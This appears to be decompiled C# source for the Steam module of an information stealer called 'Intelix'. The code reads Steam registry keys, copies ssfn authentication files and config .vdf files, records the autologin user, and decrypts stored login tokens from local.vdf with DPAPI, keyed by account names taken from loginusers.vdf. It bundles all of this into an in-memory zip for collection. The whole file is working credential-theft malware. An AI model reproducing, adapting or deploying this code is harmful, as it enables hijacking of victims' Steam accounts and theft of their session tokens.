using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Games
{
	// Token: 0x0200002A RID: 42
	public class Steam : ITarget
	{
		// Token: 0x06000077 RID: 119 RVA: 0x0000587C File Offset: 0x00003A7C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			bool flag = registryKey == null || registryKey.GetValue("SteamPath") == null;
			if (!flag)
			{
				string text = registryKey.GetValue("SteamPath").ToString();
				bool flag2 = !Directory.Exists(text);
				if (!flag2)
				{
					string path = "Steam";
					Counter.CounterApplications counterApplications = new Counter.CounterApplications();
					counterApplications.Name = "Steam";
					try
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey("Apps");
						bool flag3 = registryKey2 != null;
						if (flag3)
						{
							List<string> list = new List<string>();
							string[] subKeyNames = registryKey2.GetSubKeyNames();
							foreach (string text2 in subKeyNames)
							{
								using (RegistryKey registryKey3 = registryKey.OpenSubKey("Apps\\" + text2))
								{
									bool flag4 = registryKey3 != null;
									if (flag4)
									{
										string text3 = (registryKey3.GetValue("Name") as string) ?? "Unknown";
										string text4 = (((int?)registryKey3.GetValue("Installed")).GetValueOrDefault() == 1) ? "Yes" : "No";
										string text5 = (((int?)registryKey3.GetValue("Running")).GetValueOrDefault() == 1) ? "Yes" : "No";
										string text6 = (((int?)registryKey3.GetValue("Updating")).GetValueOrDefault() == 1) ? "Yes" : "No";
										list.Add(string.Concat(new string[]
										{
											"Application: ",
											text3,
											"\n\tGameID: ",
											text2,
											"\n\tInstalled: ",
											text4,
											"\n\tRunning: ",
											text5,
											"\n\tUpdating: ",
											text6
										}));
									}
								}
							}
							bool flag5 = list.Count > 0;
							if (flag5)
							{
								string text7 = Path.Combine(path, "Apps.txt");
								zip.AddTextFile(text7, string.Join("\n\n", list));
								counterApplications.Files.Add("Software\\Valve\\Steam\\Apps => " + text7);
							}
						}
					}
					catch
					{
					}
					try
					{
						string[] files = Directory.GetFiles(text);
						foreach (string text8 in files)
						{
							bool flag6 = text8.Contains("ssfn");
							if (flag6)
							{
								byte[] content = File.ReadAllBytes(text8);
								string text9 = Path.Combine(path, "ssfn", Path.GetFileName(text8));
								zip.AddFile(text9, content);
								counterApplications.Files.Add(text8 + " => " + text9);
							}
						}
					}
					catch
					{
					}
					try
					{
						string path2 = Path.Combine(text, "config");
						bool flag7 = Directory.Exists(path2);
						if (flag7)
						{
							string[] files2 = Directory.GetFiles(path2, "*.vdf");
							foreach (string text10 in files2)
							{
								string text11 = Path.Combine(path, "configs", Path.GetFileName(text10));
								zip.AddFile(text11, File.ReadAllBytes(text10));
								counterApplications.Files.Add(text10 + " => " + text11);
							}
						}
					}
					catch
					{
					}
					try
					{
						object value = registryKey.GetValue("AutoLoginUser");
						string str = ((value != null) ? value.ToString() : null) ?? "Unknown";
						string str2 = (((int?)registryKey.GetValue("RememberPassword")).GetValueOrDefault() == 1) ? "Yes" : "No";
						string text12 = "Autologin User: " + str + "\nRemember password: " + str2;
						string text13 = Path.Combine(path, "SteamInfo.txt");
						zip.AddTextFile(text13, text12);
						counterApplications.Files.Add("Software\\Valve\\Steam => " + text13);
					}
					catch
					{
					}
					try
					{
						string[] array4 = new string[]
						{
							Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
							Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
						};
						string[] array5 = new string[]
						{
							Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
							Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf")
						};
						string text14 = array4.FirstOrDefault(File.Exists);
						string text15 = array5.FirstOrDefault(File.Exists);
						bool flag8 = text14 == null || text15 == null;
						if (flag8)
						{
							return;
						}
						string pattern = "\"AccountName\"\\s*\"([^\"]+)\"";
						string pattern2 = "([a-fA-F0-9]{500,2000})";
						MatchCollection matchCollection = Regex.Matches(File.ReadAllText(text15), pattern);
						MatchCollection matchCollection2 = Regex.Matches(File.ReadAllText(text14), pattern2);
						bool flag9 = matchCollection.Count == 0 || matchCollection2.Count == 0;
						if (flag9)
						{
							return;
						}
						List<string> list2 = new List<string>();
						foreach (object obj in matchCollection)
						{
							Match match = (Match)obj;
							byte[] bytes = Encoding.UTF8.GetBytes(match.Groups[1].Value);
							foreach (Match tokenMatch in matchCollection2)
							{
								byte[] encryptedData = (from x in Enumerable.Range(0, tokenMatch.Value.Length / 2)
								select Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16)).ToArray<byte>();
								try
								{
									byte[] bytes2 = ProtectedData.Unprotect(encryptedData, bytes, DataProtectionScope.LocalMachine);
									list2.Add(Encoding.UTF8.GetString(bytes2));
									break;
								}
								catch
								{
									continue;
								}
							}
						}
						bool flag10 = list2.Count > 0;
						if (flag10)
						{
							string text16 = Path.Combine(path, "Token.txt");
							zip.AddTextFile(text16, string.Join("\n", list2));
							counterApplications.Files.Add(text14 + " => " + text16);
							counterApplications.Files.Add(text15 + " => " + text16);
						}
					}
					catch
					{
					}
					bool flag11 = counterApplications.Files.Count > 0;
					if (flag11)
					{
						counterApplications.Files.Add("Steam\\");
						counter.Games.Add(counterApplications);
					}
				}
			}
		}
	}
}
